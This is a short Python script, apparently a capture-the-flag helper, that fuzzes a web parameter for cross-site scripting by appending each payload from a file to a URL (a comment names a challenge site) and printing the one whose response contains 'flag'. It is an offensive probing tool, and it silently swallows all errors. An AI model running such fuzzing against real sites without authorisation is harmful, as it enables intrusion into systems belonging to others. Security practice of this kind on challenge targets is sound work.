import requests
import sys
from bs4 import BeautifulSoup

def main():
	try:
		if sys.argv[1] == "-u":
			if sys.argv[3] == "-p":
				xssfuzz(sys.argv[2], sys.argv[4])
	except:
		pass

def xssfuzz(site, pld):
	try:
		with open(pld, 'r') as file:
			pld = file.readlines()
			pld = [x.strip() for x in pld]

		with requests.session() as s:
			for i in pld:
				req = s.get(site + i) # http://chall.voilixa.ml/chall/xss.php?toc=
				soup = BeautifulSoup(req.text, 'html.parser')
				stri = soup.get_text()
				string = "flag"
				if string in stri:
					print(i)
					break
	except:
		pass

main()
